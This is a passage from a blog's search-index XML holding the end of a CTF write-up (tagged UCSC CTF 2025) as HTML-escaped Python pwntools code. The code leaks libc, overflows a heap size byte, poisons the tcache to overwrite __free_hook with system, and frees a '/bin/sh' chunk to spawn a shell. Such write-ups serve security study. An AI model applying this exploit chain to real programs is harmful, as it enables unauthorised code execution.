class="line">libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) -  0x3ebd20</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">print(&quot;libc_base  &gt;&gt; &quot; + hex(libc_base))</span><br><span class="line">add(10,0x40)</span><br><span class="line">#part2</span><br><span class="line">add(11,0x38)</span><br><span class="line">add(12,0x38)</span><br><span class="line">add(13,0x38)</span><br><span class="line">payload = b&#x27;a&#x27;*0x38 + p8(0x71)</span><br><span class="line">edit(11,payload)</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">add(12,0x68)</span><br><span class="line">payload2 = b&#x27;a&#x27;*0x38 + p64(0x41) + p64(free_hook)</span><br><span class="line">edit(12,payload2)</span><br><span class="line">add(14,0x38)</span><br><span class="line">add(15,0x38)</span><br><span class="line">edit(14,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">edit(15,p64(system_addr))</span><br><span class="line">free(14)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCSC CTF 2025 WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
